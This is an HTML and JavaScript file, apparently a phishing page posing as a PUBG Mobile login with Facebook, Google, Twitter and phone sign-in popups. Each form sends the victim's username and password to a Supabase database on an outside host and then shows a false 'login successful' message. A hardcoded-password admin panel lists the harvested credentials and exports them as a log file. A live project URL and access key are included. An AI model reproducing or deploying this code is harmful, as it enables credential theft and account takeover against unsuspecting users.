<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>PUBG Mobile Giriş</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <!-- Supabase entegrasyonu için gerekli script -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <style>
    /* CSS kodları aynı kalacak, değişiklik yapılmadı */
  </style>
</head>
<body>
  <!-- HTML yapısı aynı kalacak, değişiklik yapılmadı -->

  <script>
    // ÖNEMLİ DÜZELTME: Supabase istemcisini doğru şekilde başlatma
    const SUPABASE_URL = 'https://kjkcuccqjdsgxzhxgclb.supabase.co';
    const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtqa2N1Y2NxamRzZ3h6aHhnY2xiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTM5OTkxNDQsImV4cCI6MjA2OTU3NTE0NH0.8p6eQMAe6bNHdw7Lt9BPctVlxzakAYg-srwMXwWou_M';
    
    // Supabase istemcisini oluştur
    let supabaseClient;
    
    // Sayfa yüklendiğinde supabaseClient'ı başlat
    document.addEventListener('DOMContentLoaded', () => {
      supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
    });

    const ADMIN_USERNAME = "admin";
    const ADMIN_PASSWORD = "qwerty1234";
    
    // DOM elementleri
    const adminButton = document.getElementById('adminButton');
    const adminPanel = document.getElementById('adminPanel');
    const adminLogout = document.getElementById('adminLogout');
    const downloadLogs = document.getElementById('downloadLogs');
    const facebookLogin = document.getElementById('facebookLogin');
    const googleLogin = document.getElementById('googleLogin');
    const twitterLogin = document.getElementById('twitterLogin');
    const phoneLogin = document.getElementById('phoneLogin');
    const facebookPopup = document.getElementById('facebookPopup');
    const googlePopup = document.getElementById('googlePopup');
    const twitterPopup = document.getElementById('twitterPopup');
    const phonePopup = document.getElementById('phonePopup');
    const closeFacebookPopup = document.getElementById('closeFacebookPopup');
    const closeGooglePopup = document.getElementById('closeGooglePopup');
    const closeTwitterPopup = document.getElementById('closeTwitterPopup');
    const closePhonePopup = document.getElementById('closePhonePopup');
    const facebookForm = document.getElementById('facebookForm');
    const googleForm = document.getElementById('googleForm');
    const twitterForm = document.getElementById('twitterForm');
    const phoneForm = document.getElementById('phoneForm');
    const loginData = document.getElementById('loginData');
    const logArea = document.getElementById('logArea');
    const policyCheck = document.getElementById('policyCheck');
    const adminLoader = document.getElementById('adminLoader');
    const adminStatus = document.getElementById('adminStatus');
    
    // Admin butonuna tıklama
    adminButton.addEventListener('click', () => {
      const username = prompt("Admin Kullanıcı Adı:");
      const password = prompt("Admin Şifresi:");
      
      if(username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
        adminPanel.style.display = 'block';
        updateAdminPanel();
      } else {
        alert("Hatalı admin bilgileri!");
      }
    });
    
    // Admin panelinden çıkış yap
    adminLogout.addEventListener('click', () => {
      adminPanel.style.display = 'none';
    });
    
    // Logları indir
    downloadLogs.addEventListener('click', async () => {
      adminLoader.style.display = 'block';
      adminStatus.textContent = 'Loglar indiriliyor...';
      
      try {
        const logText = await generateLogText();
        const blob = new Blob([logText], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'pubg_login_logs.txt';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        adminStatus.textContent = 'Loglar başarıyla indirildi!';
      } catch (error) {
        adminStatus.textContent = 'Log indirme hatası: ' + error.message;
      } finally {
        setTimeout(() => {
          adminLoader.style.display = 'none';
          adminStatus.textContent = '';
        }, 3000);
      }
    });
    
    // Giriş butonlarına tıklama
    facebookLogin.addEventListener('click', () => {
      if(!policyCheck.checked) {
        alert("Lütfen gizlilik politikasını ve kullanıcı sözleşmesini kabul edin!");
        return;
      }
      
      facebookPopup.style.display = 'flex';
    });
    
    googleLogin.addEventListener('click', () => {
      if(!policyCheck.checked) {
        alert("Lütfen gizlilik politikasını ve kullanıcı sözleşmesini kabul edin!");
        return;
      }
      
      googlePopup.style.display = 'flex';
    });
    
    twitterLogin.addEventListener('click', () => {
      if(!policyCheck.checked) {
        alert("Lütfen gizlilik politikasını ve kullanıcı sözleşmesini kabul edin!");
        return;
      }
      
      twitterPopup.style.display = 'flex';
    });
    
    phoneLogin.addEventListener('click', () => {
      if(!policyCheck.checked) {
        alert("Lütfen gizlilik politikasını ve kullanıcı sözleşmesini kabul edin!");
        return;
      }
      
      phonePopup.style.display = 'flex';
    });
    
    // Popup'ları kapatma
    closeFacebookPopup.addEventListener('click', () => {
      facebookPopup.style.display = 'none';
    });
    
    closeGooglePopup.addEventListener('click', () => {
      googlePopup.style.display = 'none';
    });
    
    closeTwitterPopup.addEventListener('click', () => {
      twitterPopup.style.display = 'none';
    });
    
    closePhonePopup.addEventListener('click', () => {
      phonePopup.style.display = 'none';
    });
    
    // Form gönderimleri
    facebookForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const email = document.getElementById('facebookEmail').value;
      const password = document.getElementById('facebookPassword').value;
      const loginTime = new Date().toLocaleString();
      
      await saveLoginAttempt(email, password, 'Facebook', loginTime);
      facebookPopup.style.display = 'none';
      facebookForm.reset();
      alert("Facebook ile giriş başarılı!");
    });
    
    googleForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const email = document.getElementById('googleEmail').value;
      const password = document.getElementById('googlePassword').value;
      const remember = document.getElementById('googleRemember').checked;
      const loginTime = new Date().toLocaleString();
      
      await saveLoginAttempt(email, password, 'Google', loginTime);
      googlePopup.style.display = 'none';
      googleForm.reset();
      alert("Google ile giriş başarılı!");
    });
    
    twitterForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const username = document.getElementById('twitterUsername').value;
      const password = document.getElementById('twitterPassword').value;
      const loginTime = new Date().toLocaleString();
      
      await saveLoginAttempt(username, password, 'Twitter', loginTime);
      twitterPopup.style.display = 'none';
      twitterForm.reset();
      alert("Twitter ile giriş başarılı!");
    });
    
    phoneForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const email = document.getElementById('phoneEmail').value;
      const password = document.getElementById('phonePassword').value;
      const loginTime = new Date().toLocaleString();
      
      await saveLoginAttempt(email, password, 'Phone/Email', loginTime);
      phonePopup.style.display = 'none';
      phoneForm.reset();
      alert("Telefon/e-posta ile giriş başarılı!");
    });
    
    // Giriş denemesini kaydetme fonksiyonu (Supabase'e kaydeder)
    async function saveLoginAttempt(username, password, method, time) {
      // IP adresi simülasyonu
      const ip = `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
      
      // Supabase'e kaydet (supabaseClient kullanıyoruz)
      const { data, error } = await supabaseClient
        .from('login_attempts')
        .insert([
          { 
            username: username, 
            password: password, 
            method: method, 
            time: time, 
            ip: ip 
          }
        ]);
      
      if (error) {
        console.error('Supabase kayıt hatası:', error);
        throw new Error('Veri kaydedilemedi');
      }
    }
    
    // Admin panelini güncelleme (Supabase'den veri çeker)
    async function updateAdminPanel() {
      adminLoader.style.display = 'block';
      loginData.innerHTML = '';
      logArea.innerHTML = '';
      adminStatus.textContent = 'Veriler yükleniyor...';
      
      try {
        // Supabase'den verileri çek (supabaseClient kullanıyoruz)
        const { data: attempts, error } = await supabaseClient
          .from('login_attempts')
          .select('*')
          .order('id', { ascending: false });
        
        if (error) {
          adminStatus.textContent = 'Veri alınamadı: ' + error.message;
          throw error;
        }
        
        // Verileri tabloya ekle
        attempts.forEach(attempt => {
          const row = document.createElement('tr');
          
          let methodClass = '';
          if(attempt.method === 'Facebook') methodClass = 'method-facebook';
          if(attempt.method === 'Google') methodClass = 'method-google';
          if(attempt.method === 'Twitter') methodClass = 'method-twitter';
          if(attempt.method === 'Phone/Email') methodClass = 'method-phone';
          
          row.innerHTML = `
            <td>${attempt.id}</td>
            <td>${attempt.time}</td>
            <td>${attempt.username}</td>
            <td>${attempt.password}</td>
            <td><span class="method-badge ${methodClass}">${attempt.method}</span></td>
            <td>${attempt.ip}</td>
          `;
          loginData.appendChild(row);
          
          const logEntry = document.createElement('p');
          logEntry.innerHTML = `[${attempt.time}] - ${attempt.method} - Kullanıcı: ${attempt.username} - Şifre: ${attempt.password} - IP: ${attempt.ip}`;
          logArea.appendChild(logEntry);
        });
        
        adminStatus.textContent = `${attempts.length} kayıt başarıyla yüklendi`;
      } catch (error) {
        adminStatus.textContent = 'Veri yükleme hatası: ' + error.message;
      } finally {
        setTimeout(() => {
          adminLoader.style.display = 'none';
          adminStatus.textContent = '';
        }, 3000);
      }
    }
    
    // Log metni oluşturma (Supabase'den veri çeker)
    async function generateLogText() {
      let logText = "PUBG Mobile Giriş Logları\n";
      logText += "============================\n\n";
      
      try {
        // Supabase'den tüm verileri çek
        const { data: attempts, error } = await supabaseClient
          .from('login_attempts')
          .select('*')
          .order('id', { ascending: true });
        
        if (error) {
          throw new Error('Veri alınamadı');
        }
        
        attempts.forEach(attempt => {
          logText += `ID: ${attempt.id}\n`;
          logText += `Zaman: ${attempt.time}\n`;
          logText += `Kullanıcı Adı: ${attempt.username}\n`;
          logText += `Şifre: ${attempt.password}\n`;
          logText += `Yöntem: ${attempt.method}\n`;
          logText += `IP Adresi: ${attempt.ip}\n`;
          logText += "-------------------------\n";
        });
      } catch (error) {
        logText += "Loglar alınamadı: " + error.message;
      }
      
      return logText;
    }
    
    // Sayfa yüklendiğinde admin panelini güncelle (eğer açıksa)
    window.addEventListener('load', () => {
      if(adminPanel.style.display === 'block') {
        updateAdminPanel();
      }
    });
  </script>
</body>
</html>
